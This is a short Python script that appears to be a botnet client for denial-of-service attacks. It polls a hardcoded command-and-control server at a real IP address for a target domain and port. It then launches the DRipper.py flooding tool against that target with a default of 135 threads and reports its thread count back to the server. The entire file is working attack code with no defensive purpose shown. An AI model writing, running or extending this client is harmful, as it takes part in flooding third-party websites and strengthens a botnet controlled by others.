import subprocess

import threading

import requests

import argparse

import time

subprocess_obj = None

last_website = None

active_bot = None

parser = argparse.ArgumentParser()

parser.add_argument("-t", "--thread", default="135",help="Thread")

args = parser.parse_args()

if(args.thread):

    thread_count = int(args.thread)

else:

    thread_count = 135

def ripperbind(ip,thread,port):

    global subprocess_obj

    subprocess_obj = subprocess.Popen(["python", "DRipper.py", "-s", str(ip), "-t", str(thread), "-p", str(port)])

while(True):

    resp = requests.get("http://157.245.98.223:5000/getcommand")

    content = resp.text

    if(content.find("target")>-1):

        content = content.replace("target=","")

        domain = content.split(":")[0]

        port = content.split(":")[1]

        if(domain!=last_website):

            try:

                subprocess_obj.terminate()

                thread.join()

            except:

                pass

            thread = threading.Thread(target=ripperbind,args=(domain, thread_count, port))

            thread.start()

            last_website = domain

            requests.get(f"http://157.245.98.223:5000/aktif?sayi={thread_count}")

        time.sleep(10)

